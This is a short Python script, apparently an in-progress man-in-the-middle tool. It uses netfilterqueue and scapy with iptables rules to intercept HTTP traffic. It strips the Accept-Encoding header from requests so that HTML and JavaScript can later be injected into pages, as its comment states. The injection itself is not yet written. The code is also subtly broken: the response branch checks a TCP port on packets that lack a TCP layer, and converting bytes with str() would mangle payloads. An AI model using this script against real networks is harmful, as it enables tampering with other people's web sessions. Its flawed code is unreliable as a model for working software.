#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


# processing packet for further changes, like now we are injecting html and js codes
def process_packet(packet):
    print('packetssss')
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # checking if it is HTTP request by destination port (dport)
        print(scapy_packet.show())
        if scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request")
                # regex code to match the accept encoding
                string_modified_load = str(scapy_packet[scapy.Raw].load)
                modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", string_modified_load)
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(bytes(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            print(scapy_packet.show())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

# dont forget IP tables
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
